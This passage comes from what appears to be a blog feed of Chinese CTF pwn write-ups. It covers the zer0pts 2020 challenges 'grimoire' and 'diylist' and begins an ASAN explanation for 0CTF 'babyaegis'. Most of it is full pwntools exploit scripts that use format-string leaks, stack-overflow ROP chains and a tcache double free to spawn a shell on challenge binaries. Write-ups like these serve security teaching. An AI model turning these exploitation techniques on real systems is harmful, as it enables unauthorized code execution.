class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./chall&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># b *0x400927\n</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x400999&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">calc_num_address = <span class="number">0x40088e</span></span><br><span class="line">buf = <span class="number">0x601b00</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">22</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;n = &quot;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;num[&#123;&#125;] = &quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i+<span class="number">1</span>)), <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="string">&quot;20&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="built_in">str</span>(<span class="number">0x400897</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;SUM = &quot;</span>)</span><br><span class="line"><span class="comment"># rbp = 0x5d0</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>)) <span class="comment"># calc_address + rbp + rbp-0xb0 + canary + 0x16*2</span></span><br><span class="line"><span class="built_in">sum</span> -= <span class="number">0x400897</span></span><br><span class="line"><span class="built_in">sum</span> -= <span class="number">0x16</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot; = &quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i+<span class="number">1</span>)), <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="string">&quot;11&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="built_in">str</span>(buf))</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="built_in">str</span>(calc_num_address))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;SUM = &quot;</span>)</span><br><span class="line"><span class="comment"># 0x560</span></span><br><span class="line">sum2 = <span class="built_in">int</span>(p.recvline().strip()) <span class="comment"># calc_address + rbp - 0x70 + canary + buf + 0x16*2</span></span><br><span class="line">sum2 -= buf</span><br><span class="line">sum2 -= calc_num_address</span><br><span class="line">sum2 -= <span class="number">0x16</span>*<span class="number">2</span></span><br><span class="line">sum2 -= <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">stack_address = <span class="built_in">sum</span> - sum2 - <span class="number">0xc</span></span><br><span class="line">log.success(<span class="string">&quot;stack address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack_address)))</span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x0000000000400a83</span></span><br><span class="line">p_rsi_r15_r = <span class="number">0x0000000000400a81</span></span><br><span class="line">leave_r = <span class="number">0x0000000000400849</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="built_in">str</span>(buf))</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="built_in">str</span>(p_rdi_r))</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="built_in">str</span>(p_rsi_r15_r))</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="built_in">str</span>(buf))</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="built_in">str</span>(read_plt))</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="built_in">str</span>(leave_r))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="string">&quot;18&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="built_in">str</span>(stack_address - <span class="number">0xa0</span> + <span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="built_in">str</span>(leave_r))</span><br><span class="line">p.sendlineafter(<span class="string">&quot; = &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="number">0xdeadbeef</span>,</span><br><span class="line">    p_rdi_r, puts_got,</span><br><span class="line">    p_rsi_r15_r, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">    puts_plt,</span><br><span class="line">    p_rdi_r, <span class="number">0</span>,</span><br><span class="line">    p_rsi_r15_r, buf, <span class="number">0</span>,</span><br><span class="line">    read_plt</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc.address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x68</span></span><br><span class="line">payload += flat([</span><br><span class="line">    p_rdi_r, libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__(),</span><br><span class="line">    p_rsi_r15_r, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="grimoire"><a href="#grimoire" class="headerlink" title="grimoire"></a>grimoire</h2><p>程序提供了四种操作<code>file_open,read,edit,close</code>。默认打开的文件是<code>grimoire.txt</code>，只有先<code>open,read</code>之后才可以进行<code>edit</code>。在<code>main</code>函数中打开<code>file</code>错误时调用<code>error</code>函数中存在一个格式化字符串漏洞</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020-zer0pts-CTF-%E9%83%A8%E5%88%86PWN-WriteUp/20200929172724.png" alt="图片无法显示，请联系作者" title=" "><p>但是需要先控制<code>s</code>的值也就是<code>filepath</code>的值，这里发现在<code>edit</code>函数中还存在一个溢出漏洞，函数根据用户输入的<code>offset</code>在<code>bbs text</code>处读取最大<code>0x200</code>字节大小的数据，但是<code>text</code>只有<code>0x260</code>字节大小，因此存在溢出，注意到与<code>text</code>紧跟的是<code>fd,init,filepath</code>存储，因此我们可以通过溢出修改<code>filepath</code>的值。</p><p>此外在<code>read</code>函数中也存在一个栈溢出漏洞</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020-zer0pts-CTF-%E9%83%A8%E5%88%86PWN-WriteUp/20200929174014.png" alt="图片无法显示，请联系作者" title=" "><p><code>ftell</code>在处理某些特殊文件的时候可能会返回<code>-1</code>，而<code>content_length</code>却是<code>unsigned</code>类型，因此这里的<code>fread</code>会读取一个较长的字符串，从而造成缓冲区溢出。</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>覆写<code>filepath</code>为格式化字符串，在<code>open</code>时就会调用<code>error</code>函数，进而泄露<code>libc</code>基址和<code>canary</code>。但是这样的话只能够利用一次格式化字符串地址，因为此时的<code>filepath</code>已经发生改变，无法打开文件，也就无法通过溢出修改<code>filepath</code>。因此我们在进行泄露的时候将<code>filepath</code>改为正常的文件<code>.</code>即可，这样打开文件成功之后我们可以继续覆写<code>filepath</code>。</p><p>在泄露<code>libc</code>基址和<code>canary</code>之后就可以利用栈溢出来构造<code>rop</code>链了。但是读入数据是个问题，并不能直接将<code>fp</code>改为<code>0</code>，但是这里可以利用一种曲线的方法就是将<code>filepath</code>设置为<code>/dev/stdin</code>或者<code>/proc/self/fd/0</code>，并调用<code>read</code>函数，在打开上述文件时<code>ftell</code>会返回<code>-1</code>，因此在之后的<code>fread</code>时，可以输入数据进行栈溢出构造<code>rop chain</code>。</p><p>需要注意的是最后调试的时候需要开<code>ASLR</code>，不然会导致程序初始栈地址太高，<code>fread</code>无法读取的情况，错误代码<code>0xe</code>。        </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./chall&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *$rebase(0x1499)&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_open</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_read</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_edit</span>(<span class="params">offset, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Offset: &quot;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Text: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_close</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span> + <span class="string">b&quot;%10$p-%22$p-&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%6$hn&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(<span class="string">&#x27;.&#x27;</span>) - <span class="number">0x22</span>).encode()</span><br><span class="line"></span><br><span class="line">file_open()</span><br><span class="line">file_read()</span><br><span class="line">file_edit(<span class="number">0x200</span>, payload)</span><br><span class="line">file_open()</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;-&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;-&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">231</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;canary &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(canary)))</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += <span class="string">b&quot;/proc/self/fd/0\x00&quot;</span>.ljust(<span class="number">0x30</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">file_open()</span><br><span class="line">file_read()</span><br><span class="line">file_edit(<span class="number">0x200</span>, payload)</span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x000000000002155f</span> + libc.address</span><br><span class="line">p_rsi_r = <span class="number">0x0000000000023e8a</span> + libc.address</span><br><span class="line">p_rdx_r = <span class="number">0x0000000000001b96</span> + libc.address</span><br><span class="line">p_rax_r = <span class="number">0x0000000000043a78</span> + libc.address</span><br><span class="line">syscall = <span class="number">0x00000000000d29d5</span> + libc.address</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x200</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">payload += flat([</span><br><span class="line">    p_rdi_r, libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__(),</span><br><span class="line">    p_rsi_r, <span class="number">0</span>, p_rdx_r, <span class="number">0</span>,</span><br><span class="line">    p_rax_r, <span class="number">59</span>,</span><br><span class="line">    syscall</span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">0x4000</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">file_open()</span><br><span class="line">file_read()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;-*&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="diylist"><a href="#diylist" class="headerlink" title="diylist"></a>diylist</h2><p>程序提供了一种<code>list</code>的实现，具体的<code>add,show,edit,delete</code>函数则在自己编写的<code>.so</code>文件中，可以提供<code>int,float,string</code>三种类型的数据处理。在<code>add,delete</code>函数处理时传入参数的数据类型。</p><p>这里就存在数据类型混淆，我们可以利用<code>int,string</code>的数据类型混淆泄露<code>libc</code>基址和<code>heap</code>地址，并且注意到在<code>delete</code>函数实现过程中，全局数组中的指针没有清空，在利用<code>int</code>改写<code>list</code>中的某个元素为<code>heap</code>地址时，可以造成<code>DoubleFree</code>。</p><p><code>2.27</code>中可以直接对<code>tcache Double Free</code>，改写<code>free_hook</code>即可<code>getshell</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./chall&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x400F84&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">type</span>, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;): &quot;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">3</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Data: &quot;</span>, content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Data: &quot;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index, <span class="built_in">type</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;): &quot;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, <span class="built_in">type</span>, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;): &quot;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Data: &quot;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&quot;1&quot;</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Data: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Data: &quot;</span>)</span><br><span class="line">heap_address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;heap address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">1</span>, <span class="built_in">str</span>(heap_address))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2019 0CTF/TCTF Quals 部分PWN WriteUp</title>
      <link href="/posts/2569855600.html"/>
      <url>/posts/2569855600.html</url>
      
        <content type="html"><![CDATA[<h2 id="babyaegis"><a href="#babyaegis" class="headerlink" title="babyaegis"></a>babyaegis</h2><p>首先我们看一下程序开启的防护机制</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2019-0CTF-TCTF-Quals-%E9%83%A8%E5%88%86PWN-WriteUp/20200913154956.png" alt="图片无法显示，请联系作者" title=" "><p>程序开启了<code>ASAN,UBSAN</code>保护。</p><h3 id="ASAN"><a href="#ASAN" class="headerlink" title="ASAN"></a>ASAN</h3><p><code>asan(AddressSanitizer)</code>是<code>google</code>开源的一个用于进行内存检测的工具，可以检测常见的<code>heap and stack BufferOverflow，global buffer overflow, UAF</code>等</p><p><code>asan</code>主要由两个部分构成，插桩和动态运行库，其中插桩主要是针对的是<code>llvm</code>编译器级别对访问内存的操作（<code>store</code>，<code>load</code>和<code>alloca</code>等）,而动态运行库则主要提供一些比较复杂的操作，例如<code>position/unposion</code>（用于进行内存保护）和影子内存，同时<code>hook free,malloc</code>等函数。启用了<code>asan</code>保护的程序不同<code>size</code>大小的<code>chunk</code>是在不同内存区域进行分配的，并且<code>free</code>掉之后的内存在一段时间内并不会被启用。<code>chunk</code>也与一般的<code>chunk</code>不相同，其头部<code>0x10</code>字节大小的<code>ChunkHeader</code>用来存储<code>chunk</code>的一些信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ChunkHeader</span> &#123;</span></span><br><span class="line">  <span class="comment">// 1-st 8 bytes.</span></span><br><span class="line">  u32 chunk_state       : <span class="number">8</span>;  <span class="comment">// Must be first.</span></span><br><span class="line">  u32 alloc_tid         : <span class="number">24</span>;</span><br><span class="line">  u32 free_tid          : <span class="number">24</span>;</span><br><span class="line">  u32 from_memalign     : <span class="number">1</span>;</span><br><span class="line">  u32 alloc_type        : <span class="number">2</span>;</span><br><span class="line">  u32 rz_log            : <span class="number">3</span>;</span><br><span class="line">  u32 lsan_tag          : <span class="number">2</span>;</span><br><span class="line">  <span class="comment">// 2-nd 8 bytes</span></span><br><span class="line">  <span class="comment">// This field is used for small sizes. For large sizes it is equal to</span></span><br><span class="line">  <span class="comment">// SizeClassMap::kMaxSize and the actual size is stored in the</span></span><br><span class="line">  <span class="comment">// SecondaryAllocator&#x27;s metadata.</span></span><br><span class="line">  u32 user_requested_size : <span class="number">29</span>;</span><br><span class="line">  <span class="comment">// align &lt; 8 -&gt; 0</span></span><br><span class="line">  <span class="comment">// else      -&gt; log2(min(align, 512)) - 2</span></span><br><span class="line">  u32 user_requested_alignment_log : <span class="number">3</span>;</span><br><span class="line">  u32 alloc_context_id;</span><br><span 